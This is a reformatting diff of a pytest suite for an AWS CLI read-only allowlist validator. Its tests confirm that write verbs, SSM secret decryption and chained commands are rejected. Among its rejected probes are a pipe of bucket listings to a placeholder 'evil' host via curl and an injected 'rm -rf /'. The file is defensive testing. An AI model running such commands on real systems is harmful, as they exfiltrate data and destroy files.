@@ -8,6 +8,7 @@ Covers the MVP AWS allowlist:
   - cross-provider isolation (gcloud rejected under provider=aws)
   - AWS-specific semantic checks (SSM --with-decryption)
 """
+
 from __future__ import annotations
 
 import pytest
@@ -130,6 +131,7 @@ class TestWriteDisguisedAsRead:
         # Every entry in WRITE_DISGUISED_AS_READ must reject the bare command
         # form (the first two words it matches on) even with no arguments.
         import re
+
         for pattern in WRITE_DISGUISED_AS_READ:
             # Strip the regex prefix/suffix and pull the bare command prefix.
             core = pattern.replace(r"^aws\s+", "aws ").replace(r"\b", "")
@@ -137,9 +139,7 @@ class TestWriteDisguisedAsRead:
             # "aws lambda invoke" is the shape — pass some args to exercise
             # the real matching.
             probe = core + " --help"
-            assert not matches_allowlist_aws(probe), (
-                f"{pattern!r} should reject probe {probe!r}"
-            )
+            assert not matches_allowlist_aws(probe), f"{pattern!r} should reject probe {probe!r}"
 
 
 # ---------------------------------------------------------------------------
@@ -147,14 +147,10 @@ class TestWriteDisguisedAsRead:
 # ---------------------------------------------------------------------------
 class TestSSMDecryption:
     def test_get_parameter_without_decryption_allowed(self, aws_validator):
-        assert aws_validator.is_allowed(
-            "aws ssm get-parameter --name /prod/db/host"
-        ).allowed
+        assert aws_validator.is_allowed("aws ssm get-parameter --name /prod/db/host").allowed
 
     def test_get_parameter_with_decryption_rejected(self, aws_validator):
-        r = aws_validator.is_allowed(
-            "aws ssm get-parameter --name /prod/db/pw --with-decryption"
-        )
+        r = aws_validator.is_allowed("aws ssm get-parameter --name /prod/db/pw --with-decryption")
         assert not r.allowed
         assert r.layer == "L4"
         assert "decryption" in r.reason.lower()
@@ -167,9 +163,7 @@ class TestSSMDecryption:
 
     def test_standalone_semantic_check(self):
         # validate_query_aws runs at Layer 4b — exercise it directly.
-        ok, reason = validate_query_aws(
-            "aws ssm get-parameter --name /x --with-decryption"
-        )
+        ok, reason = validate_query_aws("aws ssm get-parameter --name /x --with-decryption")
         assert not ok
         assert "decryption" in reason.lower()
 
@@ -195,16 +189,33 @@ class TestCrossProvider:
 # ---------------------------------------------------------------------------
 class TestWriteVerbFuzz:
     WRITE_VERBS = [
-        "create", "delete", "update", "put", "tag", "untag",
-        "attach", "detach", "modify", "enable", "disable", "reset",
-        "rotate", "restore", "register", "deregister", "promote",
-        "demote", "activate", "deactivate", "import", "export",
-        "upgrade", "downgrade",
+        "create",
+        "delete",
+        "update",
+        "put",
+        "tag",
+        "untag",
+        "attach",
+        "detach",
+        "modify",
+        "enable",
+        "disable",
+        "reset",
+        "rotate",
+        "restore",
+        "register",
+        "deregister",
+        "promote",
+        "demote",
+        "activate",
+        "deactivate",
+        "import",
+        "export",
+        "upgrade",
+        "downgrade",
     ]
 
-    @pytest.mark.parametrize(
-        "service", ["ec2", "s3api", "rds", "lambda", "iam", "ecs"]
-    )
+    @pytest.mark.parametrize("service", ["ec2", "s3api", "rds", "lambda", "iam", "ecs"])
     def test_write_verbs_rejected(self, aws_validator, service):
         for verb in self.WRITE_VERBS:
             cmd = f"aws {service} {verb}-something --name x"
@@ -222,14 +233,10 @@ class TestPipes:
         ).allowed
 
     def test_head_pipe(self, aws_validator):
-        assert aws_validator.is_allowed(
-            "aws logs describe-log-groups | head -30"
-        ).allowed
+        assert aws_validator.is_allowed("aws logs describe-log-groups | head -30").allowed
 
     def test_curl_pipe_rejected(self, aws_validator):
-        assert not aws_validator.is_allowed(
-            "aws s3api list-buckets | curl http://evil"
-        ).allowed
+        assert not aws_validator.is_allowed("aws s3api list-buckets | curl http://evil").allowed
 
 
 # ---------------------------------------------------------------------------
@@ -249,8 +256,6 @@ class TestLayer1StillCatches:
         assert r.layer == "L1"
 
     def test_semicolon_blocked(self, aws_validator):
-        r = aws_validator.is_allowed(
-            "aws ec2 describe-instances; rm -rf /"
-        )
+        r = aws_validator.is_allowed("aws ec2 describe-instances; rm -rf /")
         assert not r.allowed
         assert r.layer == "L1"
